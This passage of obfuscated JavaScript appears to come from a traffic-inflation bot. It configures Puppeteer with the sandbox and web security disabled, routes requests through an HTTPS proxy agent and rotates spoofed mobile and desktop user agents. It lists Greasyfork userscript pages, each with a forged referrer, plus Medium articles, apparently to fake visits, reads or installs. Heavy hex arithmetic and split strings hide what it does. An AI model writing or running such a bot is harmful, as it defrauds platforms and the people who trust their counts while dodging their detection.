-0x22b0 + -0x1259 * -0x2 + -0x1f3] + f[w >> -0x1 * -0x1147 + -0x2eb * -0x1 + -0x3 * 0x6b6 & 0xefe + -0x2429 + -0x26 * -0x8f] + f[w >> -0x55 * 0x6f + -0x3 * -0x907 + 0x9d2 * 0x1 & 0xb0f + -0x49a + -0x666] + f[w >> 0xca2 + 0x2291 * 0x1 + -0x2f2b & -0x1ef * 0xa + -0x87c + 0x1be1] + f[w >> 0xad * 0x39 + -0x1a7 * 0xe + 0x313 * -0x5 & 0xc64 + 0xbed + 0xcf * -0x1e] + f[-0x16df + 0x1d36 + 0x3 * -0x218 & w] + f[x >> -0x1ce9 + -0xc47 + 0x2 * 0x14a6 & -0x125b + 0x8 * -0x10f + 0x1f * 0xde] + f[x >> -0x86 * -0x1f + -0xb29 * -0x1 + -0x89 * 0x33 & -0x46 * 0x1 + -0x20fa + -0x1 * -0x214f] + f[x >> -0xf43 + 0xb04 + 0x453 & -0x190d + -0x76d * 0x1 + -0x2089 * -0x1] + f[x >> -0x541 + 0x85 * 0x47 + -0x1f92 & -0x3 * -0x633 + 0x22db * -0x1 + 0x1051] + f[x >> 0xd45 + -0x2 * 0xf34 + 0x112f & -0x19de + -0x5 * 0x28 + 0x1ab5] + f[x >> -0x2 * 0xf62 + 0x1 * 0x125b + 0xc71 & 0x1 * -0x14b7 + 0x287 * 0x1 + 0x123f] + f[x >> 0x162 * 0x1 + -0xc6d + 0xb0f * 0x1 & -0x4e * -0x7b + 0x147c + 0x51 * -0xb7] + f[0x54e + 0x237f + -0x28be & x] + f[y >> -0x171b * 0x1 + -0x766 * -0x3 + 0x105 & 0x1763 + 0x223c + -0x2 * 0x1cc8] + f[y >> 0x4f6 + 0x6d3 + -0x1 * 0xbb1 & 0x3c * 0x59 + -0x698 * 0x2 + 0x79d * -0x1] + f[y >> 0x1bbf * 0x1 + 0x83c + -0x2c3 * 0xd & -0x1bd2 + -0x24a7 + 0x4088] + f[y >> -0x366 + -0x6 * 0x473 + 0x1e28 & 0x1307 * 0x1 + -0x1c3b + 0x943] + f[y >> 0x2515 * -0x1 + -0x1cc3 + 0x1 * 0x41e4 & 0x1de9 + 0x1f7c + -0x3d56] + f[y >> -0x13b8 * -0x1 + -0x2 * -0xce3 + -0xfd * 0x2e & 0x166c + -0x11a1 + -0x4bc] + f[y >> 0x38b * -0x8 + -0x8c1 * -0x3 + 0x219 & 0x1533 + -0x1673 + 0x1 * 0x14f] + f[-0x25b8 + 0x49 * -0x49 + 0x3a98 & y];
        }
        ['digest']() {
          this['finalize']();
          var u = this['h0'],
            v = this['h1'],
            w = this['h2'],
            x = this['h3'],
            y = this['h4'];
          return [
            u >> 0x434 * -0x6 + 0x22ac + -0x4ae * 0x2 & -0x1 * 0x1213 + 0x3d6 + -0x96 * -0x1a,
            u >> -0xcdc + 0x635 + 0x3 * 0x23d & -0x2e * -0x2f + -0x12a6 + -0x1 * -0xb33,
            u >> 0x26 * 0x6b + -0x19a5 + 0x9cb & 0x3 * 0xcd7 + 0x2 * 0x614 + -0x31ae,
            0x400 + 0x2 * -0xa5d + 0x11b9 & u,
            v >> 0x558 * 0x6 + -0x1 * -0xf7f + -0x1 * 0x2f77 & -0x3 * -0x6d9 + -0x748 + -0xc44,
            v >> 0x22b3 + -0xcbd + -0x15e6 & -0x1 * -0x1954 + -0x2 * 0xc79 + 0x9d,
            v >> -0x32 * -0x5 + 0x2168 * 0x1 + -0x225a & 0x19 * 0x176 + -0x21c * 0xe + -0x5ff,
            0x16a7 * -0x1 + -0x101 * 0x25 + 0x3ccb & v,
            w >> 0xf25 + -0xc * 0x33c + 0x17c3 & -0x1761 + 0xcaa + -0x5db * -0x2,
            w >> 0xd4f * 0x1 + -0x1fc4 + 0x1 * 0x1285 & 0xaa8 * -0x3 + 0x8 * -0x22 + -0x1 * -0x2207,
            w >> -0x1ab9 + -0x2a * 0x20 + 0x2001 & 0x12df * 0x1 + -0x23f * -0xb + 0x3df * -0xb, -0x1804 + 0x1e31 + -0x52e & w,
            x >> 0x4 * 0x7c + -0x49 * 0x35 + 0xd45 & -0x1cc0 + 0x44 * -0x76 + 0x3d17,
            x >> 0x9 + -0x9 * 0x2e7 + 0x2 * 0xd13 & 0x744 + -0xadb + 0x2 * 0x24b,
            x >> -0x2438 * -0x1 + -0x553 + -0x1edd & -0x1d3e + -0xf68 + 0x2da5, -0x1dbc + 0xf9c + 0x31 * 0x4f & x,
            y >> -0x1 * -0x10e7 + -0x194f * -0x1 + -0x2a1e & -0x15b * -0x7 + -0x1 * -0x4bd + -0xd3b,
            y >> 0x4c * -0xe + -0x2321 + 0x2759 * 0x1 & 0x1a91 + -0x305 + -0x17 * 0xfb,
            y >> 0x1e99 + -0xc5 * -0x25 + -0x1d85 * 0x2 & 0x19 * 0x69 + -0xa25 * 0x1 + 0xe3,
            0x108a + 0xb9 * 0x3 + -0x11b6 & y
          ];
        }
        ['arrayBuffe' + 'r']() {
          var r, s;
          return this['finalize'](), r = new ArrayBuffer(-0x806 + 0x403 + 0x1 * 0x417), (s = new DataView(r))['setUint32'](-0x29b * 0x6 + -0x1582 * -0x1 + -0x5e0, this['h0']), s['setUint32'](0x85d * -0x2 + -0x77c * -0x3 + -0x2 * 0x2db, this['h1']), s['setUint32'](0x23 * -0x4d + -0xb39 * -0x1 + -0xaa, this['h2']), s['setUint32'](0x25 * -0x2c + 0x407 * 0x9 + 0x1dd7 * -0x1, this['h3']), s['setUint32'](0x2247 + -0x117a + -0x10bd, this['h4']), r;
        }
    }
    p['prototype']['toString'] = p['prototype']['hex'], p[M(0x10)]['array'] = p['prototype']['digest'];
    const q = l();
    return q;
  })()),
  wait = f => new Promise(g => setTimeout(g, f)),
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil,
    min: min
  } = Math,
  NETWORK_PATIENCE = -0x47d * 0x7 + 0x13b5 * 0x4 + 0x89 * -0x1 + (-0x107 * -0x26 + -0xc5b * -0x1 + -0x27ad) * random(),
  MM_NETWORK_PATIENCE = (0x3ab * -0x5 + 0x2102 + -0xea8) * NETWORK_PATIENCE,
  me = random()['toString'](-0xbdb + 0x1bbf + -0xfd4)['substring'](-0x1edc + 0x58 * -0x20 + 0x29e0, -0x82c * 0x2 + 0x1d2 + 0x1 * 0xe90),
  pptOptions = {
    'headless': 0x0,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ],
    'executablePath': '/../../../' + process['env']['PUPPETEER_' + 'EXECUTABLE' + '_PATH']
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  {
    HttpsProxyAgent: HttpsProxyAgent
  } = require('https-prox' + 'y-agent'),
  data = {
    'scriptTargets': [{
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + N(0x12)
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + N(0x13) + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
        'preRef': O(0xb, 'DM$c') + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
        'preRef': 'https://gr' + P(0xc) + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + N(0xa) + '1-all-site' + 's',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
      }
    ],
    'userAgents': [
      'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
      'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
      'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
      'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
      'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + O(0x11, 'Up@Z') + '.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
    ],
    'mediumArticles': [
      'https://me' + 'dium.com/',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
      'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
      'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
      'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
      'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + N(0x8) + '72ff3bf98',
      'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
      'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
      'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
      'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
      'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
      'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
      'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
      'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
      'https://me' + N(0x2) + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
      'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
      'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
      'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
      'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + O(0x6, 'Cbdv'),
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
      'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
    ],
    'soundcloudTracks': [
